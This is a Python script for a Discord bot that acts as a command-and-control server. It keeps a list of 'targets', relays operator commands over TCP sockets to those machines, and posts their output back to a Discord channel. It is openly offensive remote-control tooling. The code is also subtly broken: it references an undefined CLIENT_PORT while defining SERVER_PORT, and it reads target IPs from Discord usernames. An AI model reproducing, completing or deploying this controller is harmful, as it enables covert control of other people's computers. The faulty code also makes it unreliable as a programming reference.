#!/usr/bin/python3

import discord
import asyncio
import socket
import json

intents = discord.Intents.all()

TOKEN = "DISCORD TOKEN"
GUILD = "DISCORD SERVER NAME"
#Which port do you want to have targets connect to
SERVER_PORT = 12345

client = discord.Client(intents=intents)

# Dictionary to store client IP addresses
CLIENT_IPS = {}

@client.event
async def on_ready():
    print(f"{client.user} is connected to the following guild(s):")
    for guild in client.guilds:
        print(f"{guild.name} (id: {guild.id})")

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith("!list"):
        targets = "\n".join(CLIENT_IPS.keys())
        if targets:
            await message.channel.send(f"Available targets:\n{targets}")
        else:
            await message.channel.send("No targets available.")
        return

    # Check if the message starts with the target name and extract the target machine and command
    target, _, command = message.content.partition(" ")
    target = target.lower()  # Convert to lowercase for case-insensitive matching

    # Verify that the target is valid
    if target not in CLIENT_IPS:
        await message.channel.send(f"Invalid target: {target}. Please wait for clients to connect.")
        return

    # Send the command to the target machine
    target_machine = CLIENT_IPS[target]
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((target_machine, CLIENT_PORT))
        client_socket.send(command.encode())
        response = client_socket.recv(4096).decode()
        await message.channel.send(response)
    except Exception as e:
        await message.channel.send(f"Error sending command to {target}: {e}")
    finally:
        client_socket.close()

@client.event
async def on_member_join(member):
    # This event is triggered when a new client joins the server
    # Extract the client's IP address from their Discord username
    target_name, _, client_ip = member.name.partition("_")
    target_name = target_name.lower()
    CLIENT_IPS[target_name] = client_ip

client.run(TOKEN)

